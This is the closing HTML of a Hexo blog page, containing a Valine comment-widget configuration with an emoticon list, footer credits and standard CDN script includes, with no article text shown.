Valine({el:"#vcomment",notify:notify,verify:verify,appId:"Xl1tFeGDPcFzY1gIYVQo75rr-gzGzoHsz",appKey:"6YTKXORDpitI5WYSHaNjY1Ho",placeholder:"发布评论",avatar:"monsterid",guest_info:guest_info,pageSize:"10",lang:"zh-cn",recordIP:!0,emoticon_url:"https://blog-1251618737.cos.ap-chengdu.myqcloud.com/alu",emoticon_list:["吐.png","喷血.png","狂汗.png","不说话.png","汗.png","坐等.png","献花.png","不高兴.png","中刀.png","害羞.png","皱眉.png","小眼睛.png","中指.png","尴尬.png","瞅你.png","想一想.png","中枪.png","得意.png","肿包.png","扇耳光.png","亲亲.png","惊喜.png","脸红.png","无所谓.png","便便.png","愤怒.png","蜡烛.png","献黄瓜.png","内伤.png","投降.png","观察.png","看不见.png","击掌.png","抠鼻.png","邪恶.png","看热闹.png","口水.png","抽烟.png","锁眉.png","装大款.png","吐舌.png","无奈.png","长草.png","赞一个.png","呲牙.png","无语.png","阴暗.png","不出所料.png","咽气.png","期待.png","高兴.png","吐血倒地.png","哭泣.png","欢呼.png","黑线.png","喜极而泣.png","喷水.png","深思.png","鼓掌.png","暗地观察.png"]})}guest_info=0==guest_info.length?GUEST_INFO:guest_info</script></div></article></main><footer id="footer" data-type="color"><div id="footer-wrap"><div class="copyright">&copy;2017 - 2020 By Yunen</div><div class="framework-info"><span>驱动</span> <a href="https://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题</span> <a href="https://github.com/jerryc127/hexo-theme-butterfly" target="_blank" rel="noopener"><span>Butterfly</span></a></div></div></footer></div><section class="rightside" id="rightside"><div id="rightside-config-hide"><i class="fa fa-book" id="readmode" title="阅读模式"></i><i class="fa fa-plus" id="font_plus" title="放大字体"></i><i class="fa fa-minus" id="font_minus" title="缩小字体"></i><a class="translate_chn_to_cht" id="translateLink" href="javascript:translatePage();" title="简繁转换" target="_self">繁</a><i class="darkmode fa fa-moon-o" id="darkmode" title="夜间模式"></i></div><div id="rightside-config-show"><div id="rightside_config" title="设置"><i class="fa fa-cog" aria-hidden="true"></i></div><a id="to_comment" href="#post-comment" title="直达评论"><i class="scroll_to_comment fa fa-comments"></i></a><i class="fa fa-list-ul close" id="mobile-toc-button" title="目录" aria-hidden="true"></i><i class="fa fa-arrow-up" id="go-up" title="回到顶部" aria-hidden="true"></i></div></section><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script id="ribbon_piao" mobile="false" src="https://cdn.jsdelivr.net/gh/jerryc127/butterfly_cdn@2.1.0/js/piao.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@latest/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/lazysizes@latest/lazysizes.min.js" async=""></script></body></html>